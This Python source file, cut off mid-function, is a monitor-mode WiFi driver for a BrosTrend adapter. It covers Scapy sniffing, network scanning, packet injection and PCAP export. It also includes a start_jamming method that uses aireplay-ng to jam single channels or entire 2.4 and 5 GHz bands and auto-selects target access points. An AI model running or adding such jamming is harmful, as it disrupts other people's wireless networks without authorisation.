"""
Controlador WiFi mejorado para adaptador BrosTrend AC1200 AC3L
Versión mejorada con mejor manejo de errores, performance y funcionalidades
"""

import subprocess
import time
import os
import sys
import struct
import threading
import queue
from collections import deque
from typing import Optional, List, Tuple, Dict, Callable
from dataclasses import dataclass

try:
    from scapy.all import *
    from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11ProbeReq, Dot11ProbeResp, RadioTap, Dot11Elt
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("ADVERTENCIA: scapy no disponible. Instala con: pip install scapy")

try:
    import pyric.pyw as pyw
    PYRIC_AVAILABLE = True
except ImportError:
    PYRIC_AVAILABLE = False


@dataclass
class WiFiNetwork:
    """Información de una red WiFi detectada"""
    ssid: str
    bssid: str
    channel: int
    rssi: int
    encryption: str
    last_seen: float


@dataclass
class WiFiPacket:
    """Paquete WiFi con metadatos"""
    data: bytes
    rssi: int
    channel: int
    timestamp: float
    packet_type: str
    bssid: Optional[str] = None
    ssid: Optional[str] = None
    source: Optional[str] = None
    destination: Optional[str] = None
    encryption: Optional[str] = None


class CircularBuffer:
    """Buffer circular para evitar pérdida de datos"""
    def __init__(self, size: int):
        self.buffer = deque(maxlen=size)
        self.size = size
        self.dropped = 0
    
    def add(self, item):
        """Añade un elemento al buffer"""
        if len(self.buffer) >= self.size:
            self.dropped += 1
        self.buffer.append(item)
    
    def get(self, count: int = 1) -> List:
        """Obtiene elementos del buffer"""
        items = []
        for _ in range(min(count, len(self.buffer))):
            if self.buffer:
                items.append(self.buffer.popleft())
        return items
    
    def peek(self, count: int = 1) -> List:
        """Observa elementos sin quitarlos"""
        return list(self.buffer)[:count]
    
    def clear(self):
        """Limpia el buffer"""
        self.buffer.clear()
        self.dropped = 0
    
    def __len__(self):
        return len(self.buffer)


class WiFiDriver:
    """Controlador mejorado para adaptador WiFi en modo monitor"""
    
    # Canales WiFi
    CHANNELS_2_4 = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14]
    CHANNELS_5 = [36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165]
    
    def __init__(self, interface: str = None, auto_detect: bool = True):
        """Inicializa el controlador WiFi mejorado
        
        Args:
            interface: Nombre de la interfaz WiFi (ej: 'wlan0', 'wlan1')
                     Si es None y auto_detect=True, intentará detectar automáticamente
            auto_detect: Si True, detecta automáticamente la interfaz
        """
        self.interface = interface
        self.monitor_interface = None
        self.current_channel = 1
        self.current_band = "2.4"  # "2.4" o "5"
        self.monitor_mode = False
        self.last_packet = None
        self.last_rssi = 0
        self.last_channel = 0
        
        # Estadísticas
        self.packets_received = 0
        self.packets_sent = 0
        self.packets_dropped = 0
        self.start_time = time.time()
        
        # Buffer circular para paquetes
        self.packet_buffer = CircularBuffer(1000)
        
        # Redes WiFi detectadas
        self.networks: Dict[str, WiFiNetwork] = {}
        
        # Threading para captura asíncrona
        self.capture_thread = None
        self.capture_active = False
        self.packet_queue = queue.Queue(maxsize=500)
        
        # Jamming de banda completa
        self.jam_all_bands_active = False
        self.jam_thread = None
        self.jam_processes = []  # Lista de procesos de jamming activos
        
        # Filtros
        self.bssid_filter: Optional[str] = None
        self.ssid_filter: Optional[str] = None
        self.packet_type_filter: Optional[str] = None
        
        # Verificar permisos (solo en Unix/Linux)
        try:
            if hasattr(os, 'geteuid') and os.geteuid() != 0:
                print("ADVERTENCIA: Se recomienda ejecutar con sudo para mejor funcionalidad.")
        except AttributeError:
            # Windows no tiene geteuid()
            pass
        
        # Detectar interfaz si no se especifica
        if not self.interface and auto_detect:
            interfaces = self.list_available_interfaces()
            if interfaces:
                self.interface = interfaces[0]
                print(f"Interfaz detectada automáticamente: {self.interface}")
            else:
                raise RuntimeError("No se pudo detectar adaptador WiFi. Verifica la conexión.")
        
        if not self.interface:
            raise ValueError("No se especificó interfaz WiFi")
        
        # Verificar que la interfaz existe
        if not self._interface_exists(self.interface):
            raise RuntimeError(f"La interfaz {self.interface} no existe o no está disponible.")
        
        # Verificar capacidades del adaptador
        self._check_adapter_capabilities()
        
        print(f"Adaptador WiFi inicializado: {self.interface}")
    
    def list_available_interfaces(self) -> List[str]:
        """Lista todas las interfaces WiFi disponibles"""
        interfaces = []
        
        try:
            # Intentar usar pyric (más confiable)
            if PYRIC_AVAILABLE:
                try:
                    cards = pyw.get_wireless_interfaces()
                    if cards:
                        interfaces.extend(cards)
                except:
                    pass
            
            # Fallback: usar iw
            try:
                result = subprocess.run(['iw', 'dev'], capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if 'Interface' in line:
                            parts = line.split()
                            if len(parts) > 1:
                                iface = parts[1]
                                if iface not in interfaces:
                                    interfaces.append(iface)
            except:
                pass
            
            # Alternativa con ip
            try:
                result = subprocess.run(['ip', 'link', 'show'], capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if ': ' in line and ('wl' in line.lower() or 'wlan' in line.lower()):
                            parts = line.split(':')
                            if len(parts) >= 2:
                                iface = parts[1].strip().split()[0]
                                if iface not in interfaces and iface:
                                    interfaces.append(iface)
            except:
                pass
        
        except Exception as e:
            print(f"Error listando interfaces: {e}")
        
        return interfaces
    
    def _interface_exists(self, interface: str) -> bool:
        """Verifica si una interfaz existe"""
        try:
            result = subprocess.run(['iw', 'dev', interface, 'info'], 
                                  capture_output=True, timeout=3)
            return result.returncode == 0
        except:
            # Fallback
            interfaces = self.list_available_interfaces()
            return interface in interfaces
    
    def _check_adapter_capabilities(self):
        """Verifica las capacidades del adaptador"""
        try:
            result = subprocess.run(['iw', 'phy', 'phy0', 'info'], 
                                  capture_output=True, text=True, timeout=5)
            if result.returncode != 0:
                # Intentar obtener phy desde la interfaz
                result = subprocess.run(['iw', 'dev', self.interface, 'info'], 
                                      capture_output=True, text=True, timeout=5)
            
            if result.returncode == 0:
                output = result.stdout
                has_monitor = 'monitor' in output.lower()
                has_injection = 'injection' in output.lower() or 'tx' in output.lower()
                
                if not has_monitor:
                    print("ADVERTENCIA: El adaptador puede no soportar modo monitor completamente.")
                if not has_injection:
                    print("ADVERTENCIA: El adaptador puede no soportar inyección de paquetes.")
        
        except Exception as e:
            print(f"Advertencia: No se pudo verificar capacidades del adaptador: {e}")
    
    def set_monitor_mode(self, enable: bool = True) -> bool:
        """Activa o desactiva modo monitor con mejor manejo de errores"""
        if not SCAPY_AVAILABLE:
            print("ERROR: scapy no está disponible. Instala con: pip install scapy")
            return False
        
        # Verificar permisos
        try:
            if enable and hasattr(os, 'geteuid') and os.geteuid() != 0:
                print("ADVERTENCIA: Modo monitor requiere permisos de administrador (sudo)")
        except AttributeError:
            pass
        
        try:
            if enable and not self.monitor_mode:
                # PASO 1: Liberar interfaz - Detener procesos que bloquean
                print("Liberando interfaz WiFi...")
                try:
                    subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'], 
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=15)
                    time.sleep(1)
                except (subprocess.TimeoutExpired, Exception):
                    pass
                
                # PASO 2: Desactivar NetworkManager para esta interfaz
                try:
                    subprocess.run(['sudo', 'nmcli', 'device', 'set', self.interface, 'managed', 'no'], 
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
                    time.sleep(0.5)
                except Exception:
                    pass
                
                # PASO 3: Bajar la interfaz antes de cambiar modo
                try:
                    subprocess.run(['sudo', 'ip', 'link', 'set', self.interface, 'down'], 
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
                    time.sleep(0.5)
                except Exception:
                    pass
                
                # PASO 4: Intentar activar modo monitor
                airmon_available = self._check_command_available('airmon-ng')
                
                if airmon_available:
                    # Intentar con airmon-ng primero (más confiable)
                    try:
                        result = subprocess.run(['sudo', 'airmon-ng', 'start', self.interface], 
                                              capture_output=True, text=True, timeout=15)
                        if result.returncode == 0:
                            # Buscar nueva interfaz monitor
                            for line in result.stdout.split('\n'):
                                if 'monitor mode' in line.lower() or 'mon' in line.lower():
                                    parts = line.split()
                                    for part in parts:
                                        if self.interface in part and 'mon' in part:
                                            self.monitor_interface = part
                                            break
                                    if self.monitor_interface:
                                        break
                            
                            # Si no se encontró, buscar patrones comunes
                            if not self.monitor_interface:
                                monitor_names = [f"{self.interface}mon", f"mon{self.interface[4:]}", f"{self.interface}mon0"]
                                for name in monitor_names:
                                    if self._interface_exists(name):
                                        self.monitor_interface = name
                                        break
                    except subprocess.TimeoutExpired:
                        print("ADVERTENCIA: Timeout con airmon-ng, intentando método alternativo...")
                
                # Fallback: usar iw directamente
                if not self.monitor_interface:
                    try:
                        # Cambiar a modo monitor con iw
                        result = subprocess.run(['sudo', 'iw', self.interface, 'set', 'type', 'monitor'], 
                                              stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=10)
                        if result.returncode == 0:
                            # Subir la interfaz
                            subprocess.run(['sudo', 'ip', 'link', 'set', self.interface, 'up'], 
                                         stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=5)
                            self.monitor_interface = self.interface
                        else:
                            error_msg = result.stderr.decode('utf-8', errors='ignore') if result.stderr else ""
                            if "Device or resource busy" in error_msg:
                                print("ERROR: La interfaz está siendo usada por otro proceso.")
                                print("Intenta manualmente: sudo airmon-ng check kill")
                                return False
                    except subprocess.TimeoutExpired:
                        print("ERROR: Timeout cambiando a modo monitor")
                        return False
                    except Exception as e:
                        print(f"ERROR: {e}")
                        return False
                
                if self.monitor_interface:
                    self.monitor_mode = True
                    print(f"Modo monitor activado en {self.monitor_interface}")
                    
                    # Iniciar captura asíncrona
                    self._start_capture_thread()
                    return True
                else:
                    print("ERROR: No se pudo crear interfaz en modo monitor")
                    print("Sugerencias:")
                    print("  1. Ejecuta: sudo airmon-ng check kill")
                    print("  2. Ejecuta: sudo nmcli device set wlan1 managed no")
                    print("  3. Verifica que el adaptador soporte modo monitor: iw phy phy1 info")
                    return False
            
            elif not enable and self.monitor_mode:
                # Detener captura
                self._stop_capture_thread()
                
                # Desactivar modo monitor
                try:
                    if self.monitor_interface and self.monitor_interface != self.interface:
                        subprocess.run(['sudo', 'airmon-ng', 'stop', self.monitor_interface], 
                                     capture_output=True, timeout=10)
                    elif self.monitor_interface:
                        # Restaurar modo managed
                        subprocess.run(['sudo', 'iw', self.interface, 'set', 'type', 'managed'], 
                                     capture_output=True, timeout=5)
                    
                    self.monitor_mode = False
                    self.monitor_interface = None
                    return True
                except Exception as e:
                    print(f"Error desactivando modo monitor: {e}")
                    return False
            
            return True
        
        except subprocess.TimeoutExpired:
            print("ERROR: Timeout esperando respuesta del sistema")
            return False
        except PermissionError:
            print("ERROR: Permisos insuficientes. Ejecuta con sudo.")
            return False
        except Exception as e:
            print(f"ERROR en set_monitor_mode: {e}")
            return False
    
    def _check_command_available(self, command: str) -> bool:
        """Verifica si un comando está disponible (multiplataforma)"""
        try:
            # Windows usa 'where', Unix/Linux usa 'which'
            if sys.platform == 'win32':
                cmd = ['where', command]
            else:
                cmd = ['which', command]
            result = subprocess.run(cmd, capture_output=True, timeout=2)
            return result.returncode == 0
        except:
            return False
    
    def _start_capture_thread(self):
        """Inicia thread para captura asíncrona de paquetes"""
        if self.capture_thread and self.capture_thread.is_alive():
            return
        
        self.capture_active = True
        self.capture_thread = threading.Thread(target=self._capture_loop, daemon=True)
        self.capture_thread.start()
    
    def _stop_capture_thread(self):
        """Detiene el thread de captura"""
        self.capture_active = False
        if self.capture_thread:
            self.capture_thread.join(timeout=2)
    
    def _capture_loop(self):
        """Loop de captura de paquetes en thread separado"""
        if not SCAPY_AVAILABLE or not self.monitor_mode:
            return
        
        interface = self.monitor_interface or self.interface
        
        try:
            while self.capture_active:
                try:
                    # Capturar paquetes (no bloqueante si no hay)
                    # stop_filter retorna False para capturar todos los paquetes
                    packets = sniff(iface=interface, count=10, timeout=0.1, quiet=True)
                    
                    for packet in packets:
                        if not self.capture_active:
                            break
                        
                        # Aplicar filtros
                        if not self._packet_passes_filter(packet):
                            continue
                        
                        # Extraer información del paquete
                        wifi_pkt = self._parse_packet(packet)
                        
                        if wifi_pkt:
                            # Añadir a buffer circular
                            try:
                                self.packet_queue.put_nowait(wifi_pkt)
                                self.packet_buffer.add(wifi_pkt)
                                self.packets_received += 1
                                
                                # Actualizar última información
                                self.last_packet = wifi_pkt
                                self.last_rssi = wifi_pkt.rssi
                                self.last_channel = wifi_pkt.channel
                            except queue.Full:
                                self.packets_dropped += 1
                
                except Exception as e:
                    if self.capture_active:
                        time.sleep(0.1)  # Evitar loop infinito de errores
        
        except Exception as e:
            print(f"Error en thread de captura: {e}")
    
    def _parse_packet(self, packet) -> Optional[WiFiPacket]:
        """Parsea un paquete WiFi y extrae información"""
        try:
            rssi = -100
            channel = self.current_channel
            packet_type = "Unknown"
            bssid = None
            ssid = None
            
            # Extraer RSSI y canal
            if packet.haslayer(RadioTap):
                rssi = packet[RadioTap].dBm_AntSignal or -100
                # RadioTap.Channel puede contener frecuencia en MHz o número de canal
                # Intentar obtener el canal, si es frecuencia, convertirla
                raw_channel = packet[RadioTap].Channel
                if raw_channel:
                    # Si el valor es > 100, probablemente es frecuencia en MHz
                    if raw_channel > 100:
                        # Convertir frecuencia a canal
                        if 2400 <= raw_channel <= 2500:
                            # 2.4 GHz: 2412 MHz = canal 1, 2417 MHz = canal 2, etc.
                            channel = int((raw_channel - 2407) / 5) + 1
                            if channel < 1:
                                channel = 1
                            elif channel > 14:
                                channel = 14
                        elif 5000 <= raw_channel <= 6000:
                            # 5 GHz: 5000 + (canal * 5) = frecuencia
                            channel = int((raw_channel - 5000) / 5)
                            if channel < 36:
                                channel = 36
                            elif channel > 165:
                                channel = 165
                        else:
                            channel = self.current_channel
                    else:
                        # Es un número de canal válido
                        channel = int(raw_channel)
                else:
                    channel = self.current_channel
            
            # Extraer información de Dot11
            source_mac = None
            dest_mac = None
            encryption_info = None
            
            if packet.haslayer(Dot11):
                dot11 = packet[Dot11]
                
                # Extraer direcciones MAC según el tipo de paquete
                if dot11.addr1:  # Destination
                    dest_mac = dot11.addr1
                if dot11.addr2:  # Source/Transmitter
                    source_mac = dot11.addr2
                if dot11.addr3:  # BSSID (en paquetes de infraestructura)
                    bssid = dot11.addr3
                elif dot11.addr2:  # Fallback
                    bssid = dot11.addr2
                elif dot11.addr1:
                    bssid = dot11.addr1
                
                # Determinar tipo de paquete y extraer información adicional
                if packet.haslayer(Dot11Beacon):
                    packet_type = "Beacon"
                    # Extraer SSID y cifrado
                    if packet.haslayer(Dot11Elt):
                        for elt in packet[Dot11Elt]:
                            if elt.ID == 0:  # SSID
                                ssid = elt.info.decode('utf-8', errors='ignore') if elt.info else "<hidden>"
                            elif elt.ID == 48:  # RSN (WPA2)
                                encryption_info = "WPA2"
                            elif elt.ID == 221:  # Vendor specific (puede contener WPA)
                                if b'WPA' in elt.info or b'wpa' in elt.info:
                                    encryption_info = "WPA"
                
                elif packet.haslayer(Dot11ProbeReq):
                    packet_type = "ProbeReq"
                    # Extraer SSID de Probe Request
                    if packet.haslayer(Dot11Elt):
                        for elt in packet[Dot11Elt]:
                            if elt.ID == 0:  # SSID
                                ssid = elt.info.decode('utf-8', errors='ignore') if elt.info else "<hidden>"
                                break
                
                elif packet.haslayer(Dot11ProbeResp):
                    packet_type = "ProbeResp"
                    # Extraer SSID de Probe Response
                    if packet.haslayer(Dot11Elt):
                        for elt in packet[Dot11Elt]:
                            if elt.ID == 0:  # SSID
                                if elt.info and len(elt.info) > 0:
                                    ssid = elt.info.decode('utf-8', errors='ignore')
                                    if not ssid.strip():
                                        ssid = "<hidden>"
                                else:
                                    ssid = "<hidden>"
                                break
                
                elif dot11.type == 0:  # Management frames
                    if dot11.subtype == 8:
                        packet_type = "Beacon"
                    elif dot11.subtype == 4:
                        packet_type = "ProbeReq"
                    elif dot11.subtype == 5:
                        packet_type = "ProbeResp"
                    elif dot11.subtype == 10:
                        packet_type = "Disassoc"
                    elif dot11.subtype == 11:
                        packet_type = "Auth"
                    elif dot11.subtype == 12:
                        packet_type = "Deauth"
                    else:
                        packet_type = f"Mgmt-{dot11.subtype}"
                
                elif dot11.type == 1:  # Control frames
                    if dot11.subtype == 11:
                        packet_type = "RTS"
                    elif dot11.subtype == 12:
                        packet_type = "CTS"
                    elif dot11.subtype == 13:
                        packet_type = "ACK"
                    else:
                        packet_type = f"Ctrl-{dot11.subtype}"
                
                elif dot11.type == 2:  # Data frames
                    if dot11.subtype == 0:
                        packet_type = "Data"
                    elif dot11.subtype == 1:
                        packet_type = "Data+CF-Ack"
                    elif dot11.subtype == 2:
                        packet_type = "Data+CF-Poll"
                    elif dot11.subtype == 3:
                        packet_type = "Data+CF-Ack+CF-Poll"
                    elif dot11.subtype == 4:
                        packet_type = "Null"
                    elif dot11.subtype == 8:
                        packet_type = "QoS Data"
                    else:
                        packet_type = f"Data-{dot11.subtype}"
                else:
                    packet_type = f"Type{dot11.type}Subtype{dot11.subtype}"
            
            return WiFiPacket(
                data=bytes(packet),
                rssi=rssi,
                channel=channel,
                timestamp=time.time(),
                packet_type=packet_type,
                bssid=bssid,
                ssid=ssid,
                source=source_mac,
                destination=dest_mac,
                encryption=encryption_info
            )
        
        except Exception as e:
            return None
    
    def _packet_passes_filter(self, packet) -> bool:
        """Verifica si un paquete pasa los filtros configurados"""
        if not self.bssid_filter and not self.ssid_filter and not self.packet_type_filter:
            return True
        
        if packet.haslayer(Dot11):
            dot11 = packet[Dot11]
            
            # Filtro por BSSID
            if self.bssid_filter:
                bssid = dot11.addr3 if dot11.addr3 else (dot11.addr2 if dot11.addr2 else dot11.addr1)
                if bssid and self.bssid_filter.lower() != bssid.lower():
                    return False
            
            # Filtro por SSID
            if self.ssid_filter and packet.haslayer(Dot11Elt):
                for elt in packet[Dot11Elt]:
                    if elt.ID == 0:  # SSID
                        ssid = elt.info.decode('utf-8', errors='ignore') if elt.info else ""
                        if self.ssid_filter.lower() not in ssid.lower():
                            return False
                        break
            
            # Filtro por tipo de paquete
            if self.packet_type_filter:
                if self.packet_type_filter.lower() == "beacon" and not packet.haslayer(Dot11Beacon):
                    return False
                elif self.packet_type_filter.lower() == "data" and dot11.type != 2:
                    return False
        
        return True
    
    def set_channel(self, channel: int, silent: bool = False) -> bool:
        """Establece el canal WiFi con validación
        
        Args:
            channel: Canal a establecer
            silent: Si True, no imprime errores (útil para loops)
        """
        # Validar canal
        if channel not in self.CHANNELS_2_4 and channel not in self.CHANNELS_5:
            if not silent:
                print(f"ERROR: Canal {channel} no válido. Use 1-14 para 2.4GHz o 36-165 para 5GHz")
            return False
        
        if channel in self.CHANNELS_2_4:
            self.current_band = "2.4"
        elif channel in self.CHANNELS_5:
            self.current_band = "5"
        
        self.current_channel = channel
        
        try:
            interface = self.monitor_interface or self.interface
            if not interface:
                return False
            
            # Si la interfaz no está en modo monitor, intentar activarlo primero
            if not self.monitor_mode:
                if not silent:
                    print(f"ADVERTENCIA: Modo monitor no activo. Intentando activar...")
                self.set_monitor_mode(True)
            
            result = subprocess.run(['sudo', 'iw', 'dev', interface, 'set', 'channel', str(channel)], 
                                  stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=10)
            
            if result.returncode == 0:
                time.sleep(0.1)  # Esperar cambio de canal
                return True
            else:
                error_msg = result.stderr.decode('utf-8', errors='ignore') if result.stderr else "Unknown error"
                if not silent:
                    # Manejar errores específicos
                    if "Device or resource busy" in error_msg:
                        print(f"ERROR: Interfaz ocupada. Intenta: sudo airmon-ng check kill")
                    elif "disabled" not in error_msg.lower() and "invalid" not in error_msg.lower():
                        print(f"ERROR cambiando canal {channel}: {error_msg}")
                return False
        
        except subprocess.TimeoutExpired:
            if not silent:
                print("ERROR: Timeout cambiando canal")
            return False
        except Exception as e:
            if not silent:
                print(f"ERROR cambiando canal: {e}")
            return False
    
    def set_filter_bssid(self, bssid: Optional[str]):
        """Configura filtro por BSSID"""
        self.bssid_filter = bssid
    
    def set_filter_ssid(self, ssid: Optional[str]):
        """Configura filtro por SSID"""
        self.ssid_filter = ssid
    
    def set_filter_packet_type(self, ptype: Optional[str]):
        """Configura filtro por tipo de paquete"""
        self.packet_type_filter = ptype
    
    def get_rssi(self) -> int:
        """Obtiene RSSI del último paquete"""
        return self.last_rssi
    
    def get_channel(self) -> int:
        """Obtiene el canal actual"""
        return self.current_channel
    
    def get_statistics(self) -> Dict:
        """Obtiene estadísticas de tráfico"""
        elapsed = time.time() - self.start_time
        return {
            'packets_received': self.packets_received,
            'packets_sent': self.packets_sent,
            'packets_dropped': self.packets_dropped,
            'buffer_size': len(self.packet_buffer),
            'buffer_dropped': self.packet_buffer.dropped,
            'elapsed_time': elapsed,
            'packets_per_second': self.packets_received / elapsed if elapsed > 0 else 0,
            'networks_found': len(self.networks)
        }
    
    def scan_networks(self, duration: float = 2.0) -> List[WiFiNetwork]:
        """Escanea y lista redes WiFi disponibles"""
        if not self.monitor_mode:
            if not self.set_monitor_mode(True):
                return []
        
        networks = {}
        start_time = time.time()
        
        # Limpiar buffer antes de escanear para obtener datos frescos
        self.packet_buffer = CircularBuffer(1000)
        
        # Calcular tiempo por canal basado en duración total
        # Priorizar 2.4 GHz (más común) y luego 5 GHz
        channels_2_4 = self.CHANNELS_2_4.copy()
        channels_5 = self.CHANNELS_5.copy()
        
        # Si la duración es corta, escanear solo 2.4 GHz primero
        if duration < 3.0:
            all_channels = channels_2_4
        else:
            all_channels = channels_2_4 + channels_5
        
        time_per_channel = duration / len(all_channels) if all_channels else 0.1
        # Mínimo 0.3 segundos por canal para capturar múltiples beacons
        # Los beacons se envían típicamente cada 100ms
        time_per_channel = max(0.3, time_per_channel)
        
        print(f"Escaneando {len(all_channels)} canales ({time_per_channel:.2f}s por canal)...")
        
        for channel in all_channels:
            if time.time() - start_time > duration:
                break
            
            # Cambiar a este canal
            self.set_channel(channel, silent=True)
            
            # Esperar más tiempo para capturar múltiples beacons
            # Los beacons se envían típicamente cada 100ms
            scan_time = min(time_per_channel, duration - (time.time() - start_time))
            if scan_time <= 0:
                break
            
            # Capturar paquetes activamente durante el tiempo asignado
            scan_start = time.time()
            packets_captured = 0
            
            while (time.time() - scan_start) < scan_time:
                # Capturar paquetes directamente en este canal
                if SCAPY_AVAILABLE:
                    interface = self.monitor_interface or self.interface
                    try:
                        # Capturar paquetes con timeout corto
                        captured = sniff(iface=interface, count=20, timeout=0.1, quiet=True)
                        
                        for packet in captured:
                            wifi_pkt = self._parse_packet(packet)
                            if wifi_pkt:
                                packets_captured += 1
                                # Añadir al buffer
                                try:
                                    self.packet_buffer.add(wifi_pkt)
                                except:
                                    pass
                    except:
                        pass
                
                # Pequeña pausa para no saturar
                time.sleep(0.05)
            
            # Obtener todos los paquetes del buffer capturados en este canal
            all_packets = self.packet_buffer.peek(500)  # Revisar más paquetes
            
            for pkt in all_packets:
                if isinstance(pkt, WiFiPacket) and pkt.bssid:
                    # Filtrar BSSID de broadcast (FF:FF:FF:FF:FF:FF) - no es una red real
                    if pkt.bssid.upper() == "FF:FF:FF:FF:FF:FF" or pkt.bssid.upper() == "FFFFFFFFFFFF":
                        continue
                    
                    # Solo procesar Beacons, ProbeResp o paquetes con SSID (redes reales)
                    if pkt.packet_type in ["Beacon", "ProbeResp"] or pkt.ssid:
                        key = pkt.bssid
                        # Si no hay SSID pero es un Beacon, marcar como hidden
                        ssid_value = pkt.ssid if (pkt.ssid and pkt.ssid != "<hidden>") else "<hidden>"
                        
                        # Actualizar o agregar red (usar mejor RSSI si ya existe)
                        if key not in networks:
                            networks[key] = WiFiNetwork(
                                ssid=ssid_value,
                                bssid=pkt.bssid,
                                channel=pkt.channel,
                                rssi=pkt.rssi,
                                encryption="Unknown",
                                last_seen=pkt.timestamp
                            )
                        else:
                            # Actualizar si este paquete tiene mejor RSSI o SSID más reciente
                            if pkt.rssi > networks[key].rssi or (not networks[key].ssid and ssid_value != "<hidden>"):
                                networks[key].rssi = pkt.rssi
                                networks[key].channel = pkt.channel
                                networks[key].last_seen = pkt.timestamp
                                if ssid_value != "<hidden>" or not networks[key].ssid:
                                    networks[key].ssid = ssid_value
        
        # Actualizar cache de redes
        self.networks.update(networks)
        
        # Ordenar por RSSI (mayor primero)
        network_list = sorted(networks.values(), key=lambda n: n.rssi, reverse=True)
        return network_list
    
    def scan_channels(self, start_channel: int, end_channel: int, callback=None) -> List[Tuple[int, int]]:
        """Escanea canales y retorna lista de (canal, rssi) con mejoras"""
        results = []
        channels_to_scan = []
        
        # Construir lista de canales a escanear
        for ch in range(start_channel, end_channel + 1):
            if ch in self.CHANNELS_2_4 or ch in self.CHANNELS_5:
                channels_to_scan.append(ch)
        
        for channel in channels_to_scan:
            self.set_channel(channel)
            time.sleep(0.15)  # Más tiempo para capturar paquetes
            
            # Obtener RSSI promedio de múltiples muestras
            rssi = self.get_channel_rssi_avg()
            results.append((channel, rssi))
            
            if callback:
                callback(channel, rssi)
        
        return results
    
    def get_channel_rssi_avg(self) -> int:
        """Obtiene RSSI promedio del canal actual (mejorado)"""
        if not SCAPY_AVAILABLE or not self.monitor_mode:
            return -100
        
        try:
            # Obtener paquetes del buffer recientes
            rssi_values = []
            packets = self.packet_buffer.peek(20)
            
            for pkt in packets:
                if isinstance(pkt, WiFiPacket) and pkt.channel == self.current_channel:
                    if -100 <= pkt.rssi <= 0:
                        rssi_values.append(pkt.rssi)
            
            if rssi_values:
                return int(sum(rssi_values) / len(rssi_values))
        
        except:
            pass
        
        return -100
    
    def receive_packet(self, timeout: float = 1.0) -> Optional[bytes]:
        """Recibe un paquete WiFi (mejorado con buffer)"""
        if not self.monitor_mode:
            return None
        
        try:
            # Intentar obtener del buffer primero
            if not self.packet_queue.empty():
                wifi_pkt = self.packet_queue.get(timeout=0.1)
                if wifi_pkt:
                    return wifi_pkt.data
            
            # Fallback: captura directa
            if SCAPY_AVAILABLE:
                interface = self.monitor_interface or self.interface
                packet = sniff(iface=interface, count=1, timeout=timeout, quiet=True)
                
                if packet:
                    wifi_pkt = self._parse_packet(packet[0])
                    if wifi_pkt:
                        return wifi_pkt.data
        
        except queue.Empty:
            pass
        except Exception:
            pass
        
        return None
    
    def send_packet(self, data: bytes) -> bool:
        """Envía un paquete WiFi con mejor manejo de errores"""
        if not SCAPY_AVAILABLE:
            return False
        
        if not self.monitor_mode:
            print("ERROR: Modo monitor no activado. No se pueden enviar paquetes.")
            return False
        
        try:
            interface = self.monitor_interface or self.interface
            if not interface:
                return False
            
            # Si los datos son un paquete Scapy completo
            try:
                packet = RadioTap(data)
                sendp(packet, iface=interface, verbose=False, count=1)
                self.packets_sent += 1
                return True
            except:
                pass
            
            # Si son datos raw, crear un paquete básico
            try:
                packet = RadioTap() / Dot11(type=2, subtype=0) / data
                sendp(packet, iface=interface, verbose=False, count=1)
                self.packets_sent += 1
                return True
            except Exception as e:
                print(f"ERROR enviando paquete: {e}")
                return False
        
        except Exception as e:
            print(f"ERROR en send_packet: {e}")
            return False
    
    def export_pcap(self, filename: str, packet_count: int = 100) -> bool:
        """Exporta paquetes a archivo PCAP (compatible con Wireshark)"""
        if not SCAPY_AVAILABLE:
            return False
        
        try:
            packets_to_export = []
            buffer_packets = self.packet_buffer.peek(packet_count)
            
            for wifi_pkt in buffer_packets:
                if isinstance(wifi_pkt, WiFiPacket):
                    try:
                        packet = RadioTap(wifi_pkt.data)
                        packets_to_export.append(packet)
                    except:
                        pass
            
            if packets_to_export:
                wrpcap(filename, packets_to_export)
                print(f"Exportados {len(packets_to_export)} paquetes a {filename}")
                return True
            else:
                print("No hay paquetes para exportar")
                return False
        
        except Exception as e:
            print(f"ERROR exportando PCAP: {e}")
            return False
    
    def start_jamming(self, target_bssid: Optional[str] = None, channel: Optional[int] = None, 
                     jam_mode: str = "channel") -> bool:
        """Inicia jamming WiFi usando aireplay-ng con mejor manejo
        
        Args:
            target_bssid: BSSID objetivo (None = broadcast)
            channel: Canal específico (None = canal actual, solo para jam_mode="channel")
            jam_mode: Modo de jamming:
                - "channel": Canal específico (2.4 o 5 GHz)
                - "band_2_4": Todos los canales 2.4 GHz (1-14)
                - "band_5": Todos los canales 5 GHz (36-165)
                - "all": Todos los canales en ambas bandas (2.4 y 5 GHz)
        """
        # Verificar que aireplay-ng esté disponible
        if not self._check_command_available('aireplay-ng'):
            print("ERROR: aireplay-ng no está instalado. Instala con: sudo apt install aircrack-ng")
            return False
        
        try:
            interface = self.monitor_interface or self.interface
            if not interface:
                return False
            
            if jam_mode == "channel":
                # Jamming en canal específico (comportamiento original)
                if channel:
                    self.set_channel(channel)
                
                # Verificar que estamos en modo monitor
                if not self.monitor_mode:
                    print("ERROR: Modo monitor no activo. Activando...")
                    if not self.set_monitor_mode(True):
                        print("ERROR: No se pudo activar modo monitor.")
                        return False
                
                # Si no se especifica BSSID, buscar uno automáticamente en el canal actual
                actual_bssid = target_bssid
                if not actual_bssid:
                    print(f"Buscando APs en canal {self.current_channel}...")
                    # Usar aireplay-ng --test para encontrar APs rápidamente
                    import os
                    if hasattr(os, 'geteuid') and os.geteuid() == 0:
                        test_cmd = ['aireplay-ng', '--test', interface]
                    else:
                        test_cmd = ['sudo', 'aireplay-ng', '--test', interface]
                    
                    try:
                        test_result = subprocess.run(
                            test_cmd,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            timeout=5,
                            universal_newlines=True
                        )
                        
                        # Parsear salida para encontrar BSSIDs
                        output = test_result.stdout + test_result.stderr
                        bssids_found = []
                        for line in output.split('\n'):
                            # Buscar líneas con formato: "BSSID - channel: X - 'SSID'"
                            if 'channel:' in line and ' - ' in line:
